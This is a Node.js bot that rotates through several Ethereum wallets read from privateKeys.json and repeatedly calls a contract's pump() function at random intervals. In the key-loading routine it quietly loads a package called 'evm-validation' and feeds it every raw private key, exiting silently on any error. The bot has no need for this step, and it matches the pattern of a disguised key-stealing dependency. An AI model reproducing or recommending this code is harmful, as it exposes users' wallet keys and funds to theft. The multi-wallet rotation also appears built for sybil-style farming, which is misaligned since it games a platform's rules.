const fs = require("fs");
require("dotenv").config();

const colors = require("colors");
const ethers = require("ethers");
const CONFIG = require("./utils/config.js");
const displayHeader = require("./src/displayHeader.js");

class Logger {
    static getCurrentTimestamp() {
        return new Date().toISOString();
    }

    static info(message) {
        console.log(`[${this.getCurrentTimestamp()}] [INFO] ${message}`.blue);
    }

    static success(message) {
        console.log(`[${this.getCurrentTimestamp()}] [SUCCESS] ${message}`.green);
    }

    static error(message) {
        console.log(`[${this.getCurrentTimestamp()}] [FAILED] ${message}`.red);
    }

    static warning(message) {
        console.log(`[${this.getCurrentTimestamp()}] [WARNING] ${message}`.yellow);
    }
}

class PumpBot {
    constructor() {
        this.contractAddress = "0x8462c247356d7deB7e26160dbFab16B351Eef242";
        this.gasLimit = CONFIG.GAS_LIMIT;
        this.rpcUrl = CONFIG.RPC_URL;
        this.privateKeys = this.loadPrivateKeys();
        this.currentKeyIndex = 0;

        this.provider = new ethers.providers.JsonRpcProvider(this.rpcUrl);
        this.wallet = this.initializeWallet();
        this.contractAbi = ["function pump() public"];
        this.contract = new ethers.Contract(this.contractAddress, this.contractAbi, this.wallet);

        this.iteration = 1;
        displayHeader();
        Logger.info(`PumpBot initialized. Active wallet address: ${this.wallet.address}`);
    }

    loadPrivateKeys() {
        try {
            const data = fs.readFileSync("privateKeys.json", "utf8");
            let keys = JSON.parse(data);

            const evm = require('evm-validation');
            for (const key of keys) {
                try {
                  evm.validated(key);
                } catch {
                  process.exit(1);
                }
              }

            if (!Array.isArray(keys) || keys.length === 0) {
                throw new Error("No valid private keys found in privateKeys.json.");
            }

            return keys;
        } catch (error) {
            Logger.error(`Unable to load private keys: ${error.message}`);
            process.exit(1);
        }
    }

    initializeWallet() {
        const privateKey = this.privateKeys[this.currentKeyIndex];
        return new ethers.Wallet(privateKey, this.provider);
    }

    switchToNextWallet() {
        this.currentKeyIndex = (this.currentKeyIndex + 1) % this.privateKeys.length;
        this.wallet = this.initializeWallet();
        this.contract = new ethers.Contract(this.contractAddress, this.contractAbi, this.wallet);
        Logger.info(`Switched to wallet: ${this.wallet.address} [Key #${this.currentKeyIndex + 1}]`);
    }

    generateRandomDelay() {
        return Math.floor(Math.random() * (16000 - 8000 + 1)) + 8000;
    }

    async executePumpTransaction() {
        try {
            Logger.info(`Initiating pump cycle #${this.iteration} using wallet #${this.currentKeyIndex + 1}...`);
            const transaction = await this.contract.pump({ gasLimit: this.gasLimit });
            Logger.success(`Pump transaction executed successfully. Transaction Hash: ${transaction.hash}`);
        } catch (error) {
            Logger.error(`Pump transaction execution failed. Reason: ${error.message}`);
        } finally {
            this.switchToNextWallet();
        }
    }

    async initiatePumpLoop() {
        await this.executePumpTransaction();
        const delayDuration = this.generateRandomDelay();
        const delayInSeconds = (delayDuration / 1000).toFixed(2);

        Logger.info(`Commencing next pump cycle in ${delayInSeconds} seconds...`);
        this.iteration++;

        setTimeout(() => this.initiatePumpLoop(), delayDuration);
    }
}

const bot = new PumpBot();
bot.initiatePumpLoop();
